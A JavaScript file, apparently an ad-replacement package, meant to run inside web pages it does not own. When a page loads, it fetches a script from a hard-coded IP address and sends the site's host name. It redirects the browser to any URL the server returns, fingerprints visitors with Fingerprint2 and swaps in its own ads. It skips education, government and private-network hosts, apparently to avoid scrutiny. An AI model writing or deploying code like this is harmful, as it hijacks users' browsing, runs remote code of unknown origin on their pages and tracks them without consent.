import { phone } from 'ismobilejs';
import { getAd, getPc } from './utils';
// import { inPC } from './inPlatform';
const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];

const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const { hostname } = window.location;
let ready = false;

function extend() {
  if (window.adExtendsJS || window.top !== window || blackWebsite.test(hostname)) return;
  window.adExtendsJS = `${name}-${version}`;
  if (window.Fingerprint2) {
    new Fingerprint2().get(() => {
      if (phone) {
        getAd();
      }
      // else inPC(uuid);
    });
    return;
  }
  if (phone) {
    getAd();
  }
  // else inPC('-');
}

function replace() {
  if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
  window.adReplaceJS = `${name}-${version}`;
  if (window.Fingerprint2) new Fingerprint2().get(uuid => getPc(uuid));
  else getPc('-');
}

function redirect() {
  const str = hostname.slice(hostname.indexOf('.') + 1);
  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
  window[fnName] = (data) => {
    if (data.url) window.location.href = data.url;
  };
  const os = document.createElement('script');
  os.src = `117.121.41.228/replace?cb=${fnName}&host=${str}`;
  document.getElementsByTagName('head')[0].appendChild(os);
  os.remove();
}
redirect();

function handler(e) {
  if (ready) return;
  if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
  setTimeout(replace, 0);
  extend();
  ready = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
  window.addEventListener('load', handler, false);
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
  window.attachEvent('onload', handler);
}
